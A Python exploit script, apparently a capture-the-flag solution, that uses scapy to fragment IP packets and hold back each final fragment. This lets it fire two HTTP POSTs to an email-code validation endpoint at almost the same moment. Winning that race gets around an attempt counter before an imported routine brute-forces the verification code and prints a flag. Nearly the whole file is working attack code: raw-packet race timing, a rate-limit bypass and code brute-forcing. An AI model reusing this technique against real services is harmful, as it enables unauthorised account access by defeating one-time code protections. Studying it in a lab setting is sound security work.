import scapy.all as sc
import requests
import random
import re
from fin import fin
from time import sleep
from brute_force import brute_force

def ip_detach_byte(pkt):
    pld = sc.raw(pkt[sc.IP].payload)
    sz = (len(pld) - 1) // 8 * 8

    lst = [pkt.copy(), pkt.copy()]
    rw = [sc.conf.raw_layer(load=pld[:sz]), sc.conf.raw_layer(load=pld[sz:])]
    flg = ['MF', 0]
    frg = [0, sz // 8]

    for p, r, f, o in zip(lst, rw, flg, frg):
        del(p[sc.IP].payload)
        del(p[sc.IP].chksum)
        del(p[sc.IP].len)
        p[sc.IP].flags = f
        p[sc.IP].frag = o
        r.overload_fields = pkt[sc.IP].payload.overload_fields.copy()
        p.add_payload(r)
    
    return lst

def get_http_message(req):
    tkn = re.match(r"http://(.*?)(/.*/)", req.url)
    path = tkn.group(2)
    host = tkn.group(1)
    headers = req.headers
    headers["Host"] = host
    mch = re.match(r"b'(.*)'", str(req.body))
    body = mch.group(1) if mch else req.body
    return '{}\r\n{}\r\n\r\n{}'.format(' '.join([req.method, path, 'HTTP/1.1']), '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()), body)

def connect(dst, dport):
    random.seed()
    seqn = random.randint(0, 1 << 31)
    sport = random.randint(1000, 1 << 15)
    id = random.randint(0, 1 << 15)

    syn = sc.IP(id=id, dst=dst) / sc.TCP(sport=sport, dport=dport, seq=seqn, flags='S')
    syn_ack = sc.sr1(syn)
    return id, sport, syn_ack[sc.TCP].ack, syn_ack[sc.TCP].seq + 1
    
def get_uuid(email, dst, dport):
    send_data = {'email': email}
    send_url = 'http://{}:{}/email-code/send/'.format(dst, dport)
    uuid = requests.post(send_url, send_data).text
    return uuid    

def send_heads(dst, dport, post):
    last_bytes = []
    sports = []

    for i in range(2):
        id, sport, seqn, ackn = connect(dst, dport)
        ip = sc.IP(id=id, dst=dst) / sc.TCP(sport=sport, dport=dport, seq=seqn, ack=ackn, flags='A') / post
        sports.append(sport)

        head, last_byte = ip_detach_byte(ip)
        last_bytes.append(last_byte)
        sc.send(head)

    return last_bytes, sports

def main():
    dst = '206.189.1.230'
    dport = 1337
    email = 'webpentest@gmail.com'

    while True:
        # get uuid
        uuid = get_uuid(email, dst, dport)

        # prepare POST
        validate_data = {'uuid': uuid, 'validation_code': '11111'}
        validate_url = 'http://{}:{}/email-code/validate/'.format(dst, dport)
        req = requests.Request('POST', validate_url, json=validate_data).prepare()
        post = get_http_message(req).encode('utf-8')

        # twist the counter
        for i in range(4):
            requests.post(validate_url, json=validate_data)

        # initialize connections and send heads
        last_bytes, sports = send_heads(dst, dport, post)

        # quasi simulteniously send last bytes
        sc.send(last_bytes)

        # get http responses
        r = sc.sniff(count=2, filter=f"(tcp port {sports[0]} or tcp port {sports[1]}) and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)")

        # close connections
        sleep(1)
        for byte in last_bytes:
            fin()

        # goto brute_force if race succeeded
        if len(r[0]) == len(r[1]):
            print("WE MADE IT")
            break
        
    print(f'Congratulations, you solved the task. flag:\n{brute_force(uuid, validate_url)}')

if __name__ == '__main__':
    main()
    